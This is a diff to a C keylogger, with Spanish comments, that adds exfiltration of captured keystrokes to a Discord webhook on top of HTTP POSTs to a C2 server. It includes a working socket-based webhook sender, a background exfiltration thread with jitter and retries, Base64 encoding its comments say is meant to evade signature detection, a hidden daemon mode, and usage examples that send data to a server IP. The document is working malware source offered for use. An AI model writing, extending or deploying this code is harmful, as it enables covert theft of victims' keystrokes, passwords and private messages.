@@ -57,9 +57,11 @@
  */
 typedef struct {
     int enabled;                          // Flag para activar exfiltración
-    char server[256];                     // IP o hostname del servidor C2
-    char port[16];                        // Puerto del servidor
-    char path[256];                       // Path del endpoint (ej: /upload)
+    int mode;                             // 0=HTTP, 1=Discord
+    char server[256];                     // IP o hostname del servidor C2 (solo HTTP)
+    char port[16];                        // Puerto del servidor (solo HTTP)
+    char path[256];                       // Path del endpoint (ej: /upload) (solo HTTP)
+    char discord_webhook[512];            // Discord webhook URL (solo Discord)
     pthread_t thread;                     // Thread de exfiltración
     pthread_mutex_t buffer_mutex;         // Mutex para sincronización del buffer
     char buffer[EXFIL_BUFFER_SIZE];       // Buffer de datos a exfiltrar
@@ -96,9 +98,11 @@ static KeyloggerState g_state = {
     .display_env = {0},
     .exfil = {
         .enabled = 0,
+        .mode = 0,
         .server = {0},
         .port = EXFIL_DEFAULT_PORT,
         .path = EXFIL_DEFAULT_PATH,
+        .discord_webhook = {0},
         .thread = 0,
         .buffer = {0},
         .buffer_len = 0,
@@ -276,6 +280,144 @@ int exfil_base64_encode(const unsigned char *input, size_t input_len,
 }
 
 /**
+ * Envía datos a Discord mediante webhook.
+ * Formato JSON simple: {"content": "mensaje"}
+ * Si falla, retorna -1 (será manejado con fallback local)
+ * 
+ * @param webhook_url URL completa del webhook Discord
+ * @param data Datos a enviar (sin codificar)
+ * @param data_len Longitud de los datos
+ * @return HTTP response code si éxito, -1 si error (fallback local)
+ */
+int discord_webhook_post(const char *webhook_url, const char *data, size_t data_len) {
+    struct addrinfo hints, *result, *rp;
+    int sockfd = -1;
+    int ret;
+    char request[EXFIL_BUFFER_SIZE + 1024];
+    char response[512];
+    int http_code = -1;
+    
+    // Parsear webhook URL: https://discord.com/api/webhooks/ID/TOKEN
+    // Extraer host y path
+    const char *url_start = strstr(webhook_url, "https://");
+    if (!url_start) {
+        url_start = strstr(webhook_url, "http://");
+        if (!url_start) {
+            return -1;  // URL inválida
+        }
+    }
+    
+    const char *host_start = url_start + (strstr(webhook_url, "https://") ? 8 : 7);
+    const char *path_start = strchr(host_start, '/');
+    
+    if (!path_start) {
+        return -1;  // URL sin path
+    }
+    
+    // Extraer hostname y puerto
+    char host[256];
+    char port[16] = "443";  // HTTPS por defecto
+    
+    size_t host_len = path_start - host_start;
+    if (host_len >= sizeof(host)) {
+        host_len = sizeof(host) - 1;
+    }
+    strncpy(host, host_start, host_len);
+    host[host_len] = '\0';
+    
+    // Separar puerto si está presente (host:puerto)
+    char *port_ptr = strchr(host, ':');
+    if (port_ptr) {
+        *port_ptr = '\0';
+        strncpy(port, port_ptr + 1, sizeof(port) - 1);
+        port[sizeof(port) - 1] = '\0';
+    }
+    
+    // Construir JSON payload
+    char json_data[EXFIL_BUFFER_SIZE + 128];
+    int json_len = snprintf(json_data, sizeof(json_data),
+        "{\"content\":\"%.*s\"}", (int)data_len, data);
+    
+    if (json_len < 0 || json_len >= (int)sizeof(json_data)) {
+        return -1;  // Error en construcción JSON
+    }
+    
+    // Configurar hints para getaddrinfo
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    
+    // Resolver hostname
+    ret = getaddrinfo(host, port, &hints, &result);
+    if (ret != 0) {
+        return -1;  // Error de resolución DNS
+    }
+    
+    // Intentar conectar
+    for (rp = result; rp != NULL; rp = rp->ai_next) {
+        sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
+        if (sockfd == -1) {
+            continue;
+        }
+        
+        struct timeval tv;
+        tv.tv_sec = 10;
+        tv.tv_usec = 0;
+        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+        
+        if (connect(sockfd, rp->ai_addr, rp->ai_addrlen) != -1) {
+            break;
+        }
+        
+        close(sockfd);
+        sockfd = -1;
+    }
+    
+    freeaddrinfo(result);
+    
+    if (sockfd == -1) {
+        return -1;  // No se pudo conectar
+    }
+    
+    // Construir request HTTP POST a Discord webhook
+    int request_len = snprintf(request, sizeof(request),
+        "POST %s HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "User-Agent: %s\r\n"
+        "Content-Type: application/json\r\n"
+        "Content-Length: %d\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+        "%s",
+        path_start, host, EXFIL_USER_AGENT, json_len, json_data);
+    
+    // Enviar request
+    ssize_t sent = send(sockfd, request, request_len, 0);
+    if (sent < 0) {
+        close(sockfd);
+        return -1;
+    }
+    
+    // Leer respuesta para verificar código HTTP
+    ssize_t received = recv(sockfd, response, sizeof(response) - 1, 0);
+    if (received > 0) {
+        response[received] = '\0';
+        // Extraer código HTTP (ej: "HTTP/1.1 204 No Content")
+        if (sscanf(response, "HTTP/%*d.%*d %d", &http_code) == 1) {
+            // Discord retorna 204 No Content o 200 OK
+            if (http_code == 200 || http_code == 204) {
+                close(sockfd);
+                return http_code;  // Éxito
+            }
+        }
+    }
+    
+    close(sockfd);
+    return -1;  // Error o código HTTP no esperado
+}
+
+/**
  * Envía datos al servidor C2 mediante HTTP POST.
  * Implementa técnicas de evasión: User-Agent spoofing y codificación Base64.
  * 
@@ -418,7 +560,9 @@ int exfil_get_jitter_interval(void) {
 /**
  * Thread principal de exfiltración.
  * Ejecuta en background, enviando datos periódicamente con jitter.
- * Implementa reintentos con backoff exponencial en caso de fallo.
+ * Soporta dos modos:
+ * 1. HTTP: Codifica en Base64, implementa reintentos
+ * 2. Discord: Envía JSON directamente, fallback a archivo local si falla
  * 
  * @param arg No utilizado
  * @return NULL
@@ -462,39 +606,61 @@ void* exfil_thread_func(void *arg) {
         
         pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
         
-        // Codificar en Base64 para evadir detección por firmas
-        int base64_len = exfil_base64_encode(
-            (unsigned char *)send_buffer, send_len,
-            base64_buffer, sizeof(base64_buffer)
-        );
-        
-        if (base64_len < 0) {
-            continue;  // Error de codificación, descartar
-        }
-        
-        // Intentar enviar con reintentos y backoff exponencial
-        retries = 0;
-        backoff = 1;
-        
-        while (retries < EXFIL_MAX_RETRIES) {
-            int result = exfil_http_post(
-                g_state.exfil.server,
-                g_state.exfil.port,
-                g_state.exfil.path,
-                base64_buffer,
-                (size_t)base64_len
+        // ====== MODO DISCORD ======
+        if (g_state.exfil.mode == 1) {
+            // Intentar enviar a Discord webhook
+            int result = discord_webhook_post(
+                g_state.exfil.discord_webhook,
+                send_buffer,
+                send_len
             );
             
-            if (result == 0) {
-                // Éxito
-                break;
+            // Si falla, fallback a archivo local
+            if (result < 0) {
+                // Fallback: escribir a keylog.txt
+                FILE *fallback_log = fopen(g_state.log_filename, "a");
+                if (fallback_log) {
+                    fprintf(fallback_log, "[DISCORD_FALLBACK] %s", send_buffer);
+                    fclose(fallback_log);
+                }
+            }
+        }
+        // ====== MODO HTTP ======
+        else {
+            // Codificar en Base64 para evadir detección por firmas
+            int base64_len = exfil_base64_encode(
+                (unsigned char *)send_buffer, send_len,
+                base64_buffer, sizeof(base64_buffer)
+            );
+            
+            if (base64_len < 0) {
+                continue;  // Error de codificación, descartar
             }
             
-            // Fallo: esperar con backoff exponencial antes de reintentar
-            retries++;
-            if (retries < EXFIL_MAX_RETRIES) {
-                sleep(backoff);
-                backoff *= 2;  // Duplicar tiempo de espera
+            // Intentar enviar con reintentos y backoff exponencial
+            retries = 0;
+            backoff = 1;
+            
+            while (retries < EXFIL_MAX_RETRIES) {
+                int result = exfil_http_post(
+                    g_state.exfil.server,
+                    g_state.exfil.port,
+                    g_state.exfil.path,
+                    base64_buffer,
+                    (size_t)base64_len
+                );
+                
+                if (result == 0) {
+                    // Éxito
+                    break;
+                }
+                
+                // Fallo: esperar con backoff exponencial antes de reintentar
+                retries++;
+                if (retries < EXFIL_MAX_RETRIES) {
+                    sleep(backoff);
+                    backoff *= 2;  // Duplicar tiempo de espera
+                }
             }
         }
     }
@@ -513,9 +679,17 @@ int init_exfiltration(void) {
         return 0;  // Exfiltración deshabilitada, nada que hacer
     }
     
-    // Validar configuración
-    if (g_state.exfil.server[0] == '\0') {
-        return -1;  // Servidor no configurado
+    // Validar configuración según modo
+    if (g_state.exfil.mode == 1) {
+        // Modo Discord: validar webhook
+        if (g_state.exfil.discord_webhook[0] == '\0') {
+            return -1;  // Webhook no configurado
+        }
+    } else {
+        // Modo HTTP: validar servidor
+        if (g_state.exfil.server[0] == '\0') {
+            return -1;  // Servidor no configurado
+        }
     }
     
     // Inicializar mutex
@@ -806,18 +980,21 @@ void print_usage(const char *prog_name) {
     printf("  -q, --quiet        Modo silencioso (sin output a consola)\n");
     printf("  -o, --output FILE  Archivo de log (default: %s)\n", LOG_FILE);
     printf("  -h, --help         Mostrar esta ayuda\n\n");
-    printf("Opciones de exfiltración (C2):\n");
-    printf("  -e, --exfil            Habilitar exfiltración HTTP\n");
-    printf("  -s, --server HOST      IP/hostname del servidor C2\n");
-    printf("  -P, --exfil-port PORT  Puerto del servidor (default: %s)\n", EXFIL_DEFAULT_PORT);
-    printf("      --exfil-path PATH  Path del endpoint (default: %s)\n\n", EXFIL_DEFAULT_PATH);
+    printf("Opciones de exfiltración (EXCLUYENTES - elegir UNA):\n");
+    printf("  -e, --exfil            Habilitar exfiltración HTTP a servidor C2\n");
+    printf("  -s, --server HOST      IP/hostname del servidor C2 (requiere -e)\n");
+    printf("  -P, --exfil-port PORT  Puerto del servidor (default: %s, requiere -e)\n", EXFIL_DEFAULT_PORT);
+    printf("      --exfil-path PATH  Path del endpoint (default: %s, requiere -e)\n\n", EXFIL_DEFAULT_PATH);
+    printf("  -D, --discord          Habilitar exfiltración a Discord webhook\n");
+    printf("      --discord-webhook  URL del webhook (compilado desde .env)\n\n");
     printf("Ejemplos:\n");
-    printf("  %s                              # Modo normal\n", prog_name);
+    printf("  %s                              # Modo normal (sin exfiltración)\n", prog_name);
     printf("  %s -d                           # Daemon oculto\n", prog_name);
     printf("  %s -d -o /tmp/k.log             # Daemon con log\n", prog_name);
-    printf("  %s -d -e -s 192.168.1.100       # Daemon con exfiltración\n", prog_name);
-    printf("  %s -d -e -s 10.0.0.5 -P 443     # Exfiltración por puerto 443\n", prog_name);
+    printf("  %s -d -e -s 192.168.1.100       # Daemon con exfiltración HTTP\n", prog_name);
+    printf("  %s -d -D                        # Daemon con Discord (webhook desde compilación)\n", prog_name);
 }
+
 
 // Función principal del keylogger
 int start_keylogger(void) {
@@ -926,8 +1103,13 @@ int start_keylogger(void) {
             return 1;
         }
         if (!g_state.quiet_mode) {
-            printf("[*] Exfiltración habilitada: %s:%s%s\n", 
-                   g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
+            if (g_state.exfil.mode == 1) {
+                printf("[*] Exfiltración Discord habilitada: %s\n", 
+                       g_state.exfil.discord_webhook);
+            } else {
+                printf("[*] Exfiltración HTTP habilitada: %s:%s%s\n", 
+                       g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
+            }
         }
     }
     
@@ -1004,20 +1186,26 @@ int main(int argc, char *argv[]) {
     
     // Opciones largas para getopt_long
     static struct option long_options[] = {
-        {"daemon",      no_argument,       0, 'd'},
-        {"quiet",       no_argument,       0, 'q'},
-        {"output",      required_argument, 0, 'o'},
-        {"help",        no_argument,       0, 'h'},
-        // Opciones de exfiltración
-        {"exfil",       no_argument,       0, 'e'},
-        {"server",      required_argument, 0, 's'},
-        {"exfil-port",  required_argument, 0, 'P'},
-        {"exfil-path",  required_argument, 0, 256},  // Solo opción larga
+        {"daemon",           no_argument,       0, 'd'},
+        {"quiet",            no_argument,       0, 'q'},
+        {"output",           required_argument, 0, 'o'},
+        {"help",             no_argument,       0, 'h'},
+        // Opciones de exfiltración HTTP
+        {"exfil",            no_argument,       0, 'e'},
+        {"server",           required_argument, 0, 's'},
+        {"exfil-port",       required_argument, 0, 'P'},
+        {"exfil-path",       required_argument, 0, 256},  // Solo opción larga
+        // Opciones de exfiltración Discord
+        {"discord",          no_argument,       0, 'D'},
+        {"discord-webhook",  required_argument, 0, 257},  // Solo opción larga
         {0, 0, 0, 0}
     };
     
     // Parsear argumentos de línea de comandos
-    while ((opt = getopt_long(argc, argv, "dqo:hes:P:", long_options, &option_index)) != -1) {
+    int http_mode = 0;
+    int discord_mode = 0;
+    
+    while ((opt = getopt_long(argc, argv, "dqo:hes:P:D", long_options, &option_index)) != -1) {
         switch (opt) {
             case 'd':
                 g_state.daemon_mode = 1;
@@ -1032,9 +1220,16 @@ int main(int argc, char *argv[]) {
             case 'h':
                 print_usage(argv[0]);
                 return 0;
-            // Opciones de exfiltración
+            // Opciones de exfiltración HTTP
             case 'e':
+                if (discord_mode) {
+                    fprintf(stderr, "[!] Error: No puedes usar -e y -D simultáneamente\n");
+                    print_usage(argv[0]);
+                    return 1;
+                }
+                http_mode = 1;
                 g_state.exfil.enabled = 1;
+                g_state.exfil.mode = 0;  // Modo HTTP
                 break;
             case 's':
                 strncpy(g_state.exfil.server, optarg, sizeof(g_state.exfil.server) - 1);
@@ -1048,17 +1243,46 @@ int main(int argc, char *argv[]) {
                 strncpy(g_state.exfil.path, optarg, sizeof(g_state.exfil.path) - 1);
                 g_state.exfil.path[sizeof(g_state.exfil.path) - 1] = '\0';
                 break;
+            // Opciones de exfiltración Discord
+            case 'D':
+                if (http_mode) {
+                    fprintf(stderr, "[!] Error: No puedes usar -e y -D simultáneamente\n");
+                    print_usage(argv[0]);
+                    return 1;
+                }
+                discord_mode = 1;
+                g_state.exfil.enabled = 1;
+                g_state.exfil.mode = 1;  // Modo Discord
+                break;
+            case 257:  // --discord-webhook
+                strncpy(g_state.exfil.discord_webhook, optarg, sizeof(g_state.exfil.discord_webhook) - 1);
+                g_state.exfil.discord_webhook[sizeof(g_state.exfil.discord_webhook) - 1] = '\0';
+                break;
             default:
                 print_usage(argv[0]);
                 return 1;
         }
     }
     
-    // Validar opciones de exfiltración
-    if (g_state.exfil.enabled && g_state.exfil.server[0] == '\0') {
-        fprintf(stderr, "[!] Error: Exfiltración habilitada pero falta --server\n");
+    // Validar opciones de exfiltración según modo
+    if (http_mode && g_state.exfil.server[0] == '\0') {
+        fprintf(stderr, "[!] Error: Exfiltración HTTP habilitada pero falta --server\n");
         print_usage(argv[0]);
         return 1;
+    }
+    
+    if (discord_mode && g_state.exfil.discord_webhook[0] == '\0') {
+        // Si no se proporciona webhook en CLI, usar el compilado desde .env
+        #ifdef DISCORD_WEBHOOK
+            strncpy(g_state.exfil.discord_webhook, DISCORD_WEBHOOK, sizeof(g_state.exfil.discord_webhook) - 1);
+            g_state.exfil.discord_webhook[sizeof(g_state.exfil.discord_webhook) - 1] = '\0';
+        #else
+            fprintf(stderr, "[!] Error: Discord habilitado pero no hay webhook configurado\n");
+            fprintf(stderr, "[!] Proporciona: --discord-webhook URL\n");
+            fprintf(stderr, "[!] O configura .env con DISCORD_WEBHOOK_URL antes de compilar\n");
+            print_usage(argv[0]);
+            return 1;
+        #endif
     }
     
     return start_keylogger();
